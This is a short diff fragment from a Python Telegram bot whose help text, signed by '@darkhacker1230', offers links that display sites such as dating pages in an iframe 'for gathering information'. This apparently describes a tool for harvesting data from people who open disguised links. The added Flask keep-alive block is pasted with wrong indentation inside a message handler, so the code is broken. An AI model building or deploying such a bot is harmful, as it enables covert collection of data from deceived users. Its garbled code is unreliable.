@@ -137,6 +137,24 @@ SEND /create TO BEGIN , AFTERWARDS IT WILL ASK YOU FOR A URL WHICH WILL BE USED 
 2. WEBVIEW LINK: THIS WILL SHOW A WEBSITE (ex bing , DATING SITES ETC) USING IFRAME FOR GATHERING INFORMATION.( ⚠️ MANY SITES MAY NOT WORK UNDER THIS METHOD IF THEY HAVE X-FRAME HEADER PRESENT.ex HTTPS://google.com )
 
 OWNER - @darkhacker1230"""
+    from flask import Flask
+from threading import Thread
+
+app = Flask('')
+
+@app.route('/')
+def home():
+    return "I am alive!"
+
+def run():
+    app.run(host='0.0.0.0', port=8080)
+
+def keep_alive():
+    t = Thread(target=run)
+    t.start()
+
+# अपना बोट शुरू करने से पहले इसे कॉल करें
+keep_alive()
     
     bot.reply_to(message, help_text)
 @bot.message_handler(commands=['create'])
